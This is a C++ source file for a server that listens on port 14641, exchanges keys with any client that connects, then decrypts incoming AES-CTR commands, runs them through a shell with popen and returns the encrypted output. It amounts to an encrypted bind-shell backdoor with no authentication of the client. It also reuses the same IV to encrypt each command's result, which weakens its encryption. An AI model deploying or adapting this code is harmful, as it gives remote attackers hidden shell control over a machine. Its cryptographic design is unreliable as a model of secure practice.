extern "C" {
    #include <tommath.h>
}
#include<iostream>
#include<sys/socket.h>
#include<sys/types.h>
#include<netdb.h>
#include<unistd.h>
#include<vector>
#include<memory>
#include<stdexcept>
#include<string>
#include<array>
#include<cstdio>
#include "crypto/crypto.h"
#include "crypto/hashing/sha256.h"
#include "crypto/aes/aes.h"

constexpr auto PORT = "14641";
constexpr auto BACKLOG = 10;

bool send_results(int new_sockfd, const char* result, int total_length){
    /*
     * Takes result char* as an input
     * Sends command output to peer through new_sockfd
     */
    int total_sent = 0;
    while(total_sent < total_length){
        int bytes_sent = send(new_sockfd, result + total_sent, total_length - total_sent, 0);
        if(bytes_sent == 0) return false;
        total_sent += bytes_sent;
    }
    return true;
}

std::string exec(const char* cmd) {
    /*
     * Takes command as input
     * Opens a pipe to shell in read mode
     * Reads command output into chunks that get stored in buffer
     * Appends each chunk to result string
     */
    std::array<char, 128> buffer;
    std::string result;
    using file_closer = int (*)(FILE*);
    std::unique_ptr<FILE, file_closer> pipe(popen(cmd, "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

int create_and_bind_socket(const std::string& port){
    /*
     * Fetch network info of our own port 14641
     * Bind a socket to this port
     * Return the socket file descriptor
     */
    addrinfo hints{};
    hints.ai_flags = AI_PASSIVE;
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    addrinfo *results;

    int status = getaddrinfo(NULL, port.c_str(), &hints, &results);
    if(status != 0){
        std::cerr << "Error while fetching address info: " << gai_strerror(status) << '\n';
        exit(1);
    }

    int sockfd = -1;
    for(auto node = results; node != NULL; node = node->ai_next){
        sockfd = socket(node->ai_family, node->ai_socktype, node->ai_protocol);
        if(sockfd == -1) continue;

        int yes = 1;
        if(setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes)) < 0){
            std::cerr << "setsockopt(SO_REUSEADDR) failed\n";
            close(sockfd);
            continue;
        }

        if(bind(sockfd, node->ai_addr, node->ai_addrlen) != -1) break;
        close(sockfd);
        sockfd = -1;
    }

    freeaddrinfo(results);

    if(sockfd == -1){
        std::cerr << "Error while binding to a socket\n";
        exit(1);
    }

    return sockfd;
}

std::string perform_key_exchange(int sockfd, int& new_sockfd){
    /*
     * Listen on the port
     * New sockfd is created after accpeting the connection
     * Generate private and public key
     * Return symmetric_key
     */
    if(listen(sockfd, BACKLOG) == -1){
        std::cerr << "Error while listening on a port\n";
        exit(1);
    }

    sockaddr_storage peer_addr;
    socklen_t peer_addr_length = sizeof(peer_addr);
    int accept_sockfd = accept(sockfd, (struct sockaddr*)&peer_addr, &peer_addr_length);
    new_sockfd = accept_sockfd;
    if(accept_sockfd == -1){
        std::cerr << "Error while accepting a connection\n";
        exit(1);
    }

    uint8_t peer_key_buffer[256];
    int recv_status = recv(accept_sockfd, peer_key_buffer, 256, MSG_WAITALL);
    if(recv_status <= 0){
        std::cerr << "Error while receiving peer's public_key or Connection closed...\n";
        exit(1);
    }

    mp_int private_key, public_key;
    generate_private_key(private_key);
    generate_public_key(private_key, public_key);

    uint8_t public_key_buffer[256];
    size_t public_key_written = mp_to_buffer(public_key, public_key_buffer);

    if(send(accept_sockfd, public_key_buffer, public_key_written, 0) == -1){
        std::cerr << "Error while sending public_key\n";
        exit(1);
    }

    mp_int peer_public_key = buffer_to_mp(peer_key_buffer, recv_status);

    std::string symmetric_key = calculate_symmetric_key(peer_public_key, private_key);

    mp_clear(&private_key);
    mp_clear(&public_key);
    mp_clear(&peer_public_key);

    close(sockfd);

    return symmetric_key;
}

void command_loop(int new_sockfd, std::string symmetric_key){
    /*
     * Takes new_sockfd and symmetric key as input
     * Listens on new_sockfd
     * Receive encrypted command length
     * Receive encrypted command
     * Receive IV for decryption
     * Decrypt the encrypted command
     * Encrypt the result
     * Send encrypted result length
     * Send the encrypted result
     */
    while(true){
        uint32_t ctr_enc_size{};
        int length_status = recv(new_sockfd, &ctr_enc_size, 4, MSG_WAITALL);
        if(length_status == 0){
            std::cerr << "Connection closed\n";
            break;
        }
        else if(length_status == -1){
            std::cerr << "Error while receiving length\n";
            exit(1);
        }
        ctr_enc_size = ntohl(ctr_enc_size);

        if(ctr_enc_size > 10000){  // Reasonable limit
            std::cerr << "Received unreasonable command size: " << ctr_enc_size << std::endl;
            break;
        }

        std::vector<char> enc_command(ctr_enc_size);
        int command_status = recv(new_sockfd, enc_command.data(), ctr_enc_size, MSG_WAITALL);
        if(command_status <= 0){
            std::cerr << "Connection closed or error receiving command\n";
            break;
        }

        unsigned char iv[16];
        int iv_status = recv(new_sockfd, &iv, 16, MSG_WAITALL);
        if(iv_status <= 0){
            std::cerr << "Connection closed or error receiving IV\n";
            break;
        }

        std::string dec_command = aes_ctr(std::string(enc_command.begin(), enc_command.end()), symmetric_key, iv);

        std::string result = exec(dec_command.c_str());

        std::string enc_result = aes_ctr(result, symmetric_key, iv);

        uint32_t enc_result_size = htonl(enc_result.size());
        int enc_result_size_status = send(new_sockfd, &enc_result_size, sizeof(enc_result_size), 0);
        if(enc_result_size_status == -1){
            std::cerr << "Error while sending results size\n";
        }
        if(!send_results(new_sockfd, enc_result.data(), enc_result.size())){
            std::cerr << "Error while sending results\n";
        }
    }
    close(new_sockfd);
}

int main(){
    int sockfd = create_and_bind_socket(PORT);
    int new_sockfd{};
    std::cout << "Waiting for connection...\n";
    std::string symmetric_key = perform_key_exchange(sockfd, new_sockfd);
    std::cout << "Connection Established!\n";
    command_loop(new_sockfd, symmetric_key);
    return 0;
}
